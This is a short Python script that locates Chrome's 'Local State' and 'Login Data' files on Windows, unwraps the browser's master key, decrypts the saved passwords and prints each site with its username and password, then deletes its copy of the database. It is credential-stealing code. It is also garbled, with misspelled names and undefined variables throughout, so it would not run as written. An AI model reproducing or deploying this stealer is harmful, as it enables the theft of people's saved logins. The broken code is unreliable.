import os
import json
from base64 import b64decode
import sqlite3
from win32crypt import CrytUnprotectData 
from Cryptodome.Cipher import AES
import shutil

def getMasterKey(localState):
	with open(localState, "r") as f:
		state = json.loads(f.read())
	masterKey = b64decode(state["os_crypt"]["encrypted_key"])[5:]
	masterKey = CryptUnprotectData(masterKey, None, None, None, p)[1]
	return masterKey

def decryptPassword(buff, masterKey):
	IV = buf[3:15]
	ciphertext = buf[15:]
	aes = AES.new(masterKey,AES.MODE_GCM,IV)
	plaintext = aes.decrypt(ciphertext)
	password = plaintext[:-16].decode()
	return password

path = os.path.join(os.environ['USERPROFILE'], r'AppData\Local\Google\Chrome\User Data')
localState = os.path.join(path,"Local State")
loginData = os.path.join(path,"default","Login Data")
masterkey = getMasterKey(localState)
shutil.copy2(loginData, "Login Data")
conn = sqlite3.connect("Login Data")
cursor = conn.cursor()
try:
	c = "SELECT action_url, username_value, password_value FROM logins"
	cursor.execute(c)
	for r in curso.fetchall():
		url = r[0]
		username = r[1]
		ciphertext = r[2]
		try:
			decryptPassword = decruptPassword(ciphertext, masterKey)
			if len(username) > 0:
				print("%s" % url)
				print("\tUsername: %s" % username)
				print("\tPassword: %s" % decryptPassword)
		except:
			continue
except Exception as e:
	pass
cursor.close()
comm.close()
try:
	os.remove("Login Data")
except Exeception as e:
	pass

